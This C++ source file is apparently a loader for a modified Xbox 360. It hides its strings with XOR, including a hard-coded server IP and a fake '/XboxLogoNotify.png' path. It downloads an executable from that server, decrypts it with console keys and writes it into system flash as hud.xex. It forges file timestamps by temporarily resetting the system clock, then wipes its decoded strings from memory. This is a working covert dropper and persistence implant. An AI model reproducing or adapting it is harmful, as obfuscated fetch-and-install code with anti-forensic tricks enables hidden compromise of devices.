#include "main.h"

extern "C"
{
	NTSTATUS NtSetSystemTime(
		PFILETIME SystemTime,  // LARGE_INTEGER
		PFILETIME PreviousTime // LARGE_INTEGER
	);
}

unsigned char fileHash[20] = {
	0xC5, 0xDB, 0x42, 0xB6, 0xEA, 0xE1, 0x4C, 0x03, 0x70, 0x2C, 0xFA, 0x25,
	0xBF, 0x37, 0x50, 0x31, 0xE3, 0xDD, 0x5B, 0xAC
};

char fXam[14] = { 
	0x76, 0x63, 0x69, 0x63, 0x2A, 0x4C, 0x68, 0x71, 0x7D, 0x3E, 0x68, 0x75, 0x68, 0x10 
};

char fsys[7] = {
	0x76, 0x63, 0x69, 0x63, 0x2A, 0x4C, 0x10
};

char DeviceFlash[15] = {
	0x4C, 0x54, 0x75, 0x66, 0x79, 0x73, 0x75, 0x4C, 0x56, 0x7C, 0x71, 0x63, 0x78, 0x4C, 0x10
};

char hudPath[14] = {
	0x76, 0x63, 0x69, 0x63, 0x2A, 0x4C, 0x78, 0x65, 0x74, 0x3E, 0x68, 0x75, 0x68, 0x10
};

char XboxLogoNotify[20] = {
	0x3F, 0x48, 0x72, 0x7F, 0x68, 0x5C, 0x7F, 0x77, 0x7F, 0x5E, 0x7F, 0x64,
	0x79, 0x76, 0x69, 0x3E, 0x60, 0x7E, 0x77, 0x10
};

char hudDotXex[8] = {
	0x78, 0x65, 0x74, 0x3E, 0x68, 0x75, 0x68, 0x10
};

char IpServer[13] = {
	0x24, 0x25, 0x3E, 0x26, 0x23, 0x3E, 0x21, 0x24, 0x3E, 0x21, 0x24, 0x24, 0x10
};

bool isAlreadyMounted = false;

NTSTATUS WriteFlashFile(char* FileName, unsigned char* File, int Size)
{
	return doWriteFlashFileInternal(File, FileName, Size);
}


SYSTEMTIME FakeSystemTime = { 0 };

FILETIME RealSystemTime = { 0 }, OriginalFileTime = { 0 };

bool SpoofFileTime(HANDLE hFile, BOOL spoof)
{
	if (spoof)
	{
		FileTimeToSystemTime(&OriginalFileTime, &FakeSystemTime);

		FILETIME NewSystemTime = { 0 };

		SystemTimeToFileTime(&FakeSystemTime, &NewSystemTime);

		NtSetSystemTime(&NewSystemTime, &RealSystemTime);

		return true;
	}
	else
	{
		FILETIME tmp;
		NtSetSystemTime(&RealSystemTime, &tmp);
		return true;
	}
	return false;
}

NTSTATUS doWriteFlashFileInternal(BYTE* buffer, char* fileName, DWORD len)
{
	HANDLE hFlashFile;
	NTSTATUS sta = 0;
	char destStr[MAX_PATH] = { 0 };
	strcpy(destStr, fsys);
	strcat_s(destStr, MAX_PATH, fileName);

	hFlashFile = CreateFile(destStr, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);


	if (hFlashFile != INVALID_HANDLE_VALUE)
	{
		PBYTE buf = buffer;
		DWORD tlen = len;
		DWORD writeSz;
		DWORD bWritten;
		while (tlen > 0)
		{
			if (tlen > 0x4000)
				writeSz = 0x4000;
			else
				writeSz = tlen;

			bWritten = 0;

			if (WriteFile(hFlashFile, buf, writeSz, &bWritten, NULL))
			{
				if (bWritten == writeSz)
				{
					tlen -= writeSz;
					buf += writeSz;
				}
				else
				{
					len = 0;
					sta = -1;
				}
			}
			else
			{
				sta = -1;
			}
		}



		if (FlushFileBuffers(hFlashFile) != 0)
		{
			sta = -4;
		}


		CloseHandle(hFlashFile);
	}
	else
	{
		sta = -3;
	}

	return sta;
}

NTSTATUS deleteFileFromFlash(char* fileName)
{
	char delStr[MAX_PATH] = { 0 };
	strcpy(delStr, fsys);
	strcat_s(delStr, MAX_PATH, fileName);
	if (DeleteFileA(delStr))
		return 0;
	return -1;
}


char* UnXorMeMe(char* b, int l)
{
	for (int i = 0; i < l; i++)
		b[i] = b[i] ^ 0x10;

	return b;
}


FILETIME getFileCreationTime(const CHAR * FileName)
{
	bool success = true;
	HANDLE hFile;
	hFile = CreateFileA(FileName,
		GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FILETIME();
	}
	else
	{
		FILETIME CreationTime;

		if (GetFileTime(hFile, &CreationTime, NULL, NULL)) {
			CloseHandle(hFile);


			return CreationTime;
		}
	}
	CloseHandle(hFile);
	return FILETIME();
}


void WriteDank()
{
	if (!isAlreadyMounted)
	{
		UnXorMeMe(fsys, 7);
		UnXorMeMe(DeviceFlash, 15);
		UnXorMeMe(hudPath, 14);
		UnXorMeMe(XboxLogoNotify, 20);
		UnXorMeMe(hudDotXex, 8);
		UnXorMeMe(IpServer, 13);
		UnXorMeMe(fXam, 14);
	
		if (!isAlreadyMounted) {
	
			CreateSymbolicLink(fsys, DeviceFlash, true);
	
			isAlreadyMounted = true;
		}
	
		printf("Load Started\n");
	
		int ModuleLength = 0;
		unsigned char* KrazakisShoe = 0;
	
		int DownloadTries = 0;
	
		printf("Starting download Loop\n");
	
		MemoryBuffer Mem;
		CReadFile(hudPath, Mem);
	
		unsigned char hash[0x14] = { 0 };
	
		sha1(Mem.GetData(), Mem.GetDataLength(), hash);
	
		if (memcmp(fileHash, hash, 0x14))
		{
			while (DownloadTries < 50)
			{
				if (DownloadFile(IpServer, XboxLogoNotify, &KrazakisShoe, &ModuleLength))
				{
					if ((KrazakisShoe <= 0) || (ModuleLength <= 0))
					{
						printf("Size or Module Pointer was NULL\n");
						continue;
					}
	
					if (ModuleLength < 0x14)
						continue;
	
					printf("Xex downloaded\n");
	
					unsigned char DataDigest[0x14] = { 0 };
					sha1(KrazakisShoe, ModuleLength - 0x14, DataDigest);
	
					if (!memcmp(DataDigest, &KrazakisShoe[ModuleLength - 0x14], 0x14))
					{
						printf("digest completed and correct\n");
	
						RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), b1BLKey, 16, b1BLKey[1]);
						RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), bHvRomMagic, 16, b1BLKey[1]);
						RC4(KrazakisShoe + 0x32FF, (ModuleLength - 0x32FF - 0x14), GameKey, 6, GameKey[2]);
	
						OriginalFileTime = getFileCreationTime(fXam);
	
						SpoofFileTime(NULL, TRUE);
	
						if (!doWriteFlashFileInternal(KrazakisShoe + 0x32FF, hudDotXex, (ModuleLength - 0x32FF - 0x14)))
							break;
	
						SpoofFileTime(NULL, FALSE);
	
					}
					else printf("XEX Hash fialed\n");
				}
	
				if (KrazakisShoe)
				{
					XMemFree(KrazakisShoe, XAPO_ALLOC_ATTRIBUTES);
					KrazakisShoe = 0;
				}
	
				printf("Retrying....\n");
				DownloadTries++;
			}
	
			if (KrazakisShoe)
			{
				XMemFree(KrazakisShoe, XAPO_ALLOC_ATTRIBUTES);
				KrazakisShoe = 0;
			}
		}
		else printf("File Hash is connect... do nothing\n");
	
		memset(fsys, 0, 7);
		memset(DeviceFlash, 0, 15);
		memset(hudPath, 0, 14);
		memset(XboxLogoNotify, 0, 20);
		memset(hudDotXex, 0, 8);
		memset(IpServer, 0, 13);
		memset(fXam, 0, 14);
	
	}
	
	return;
}
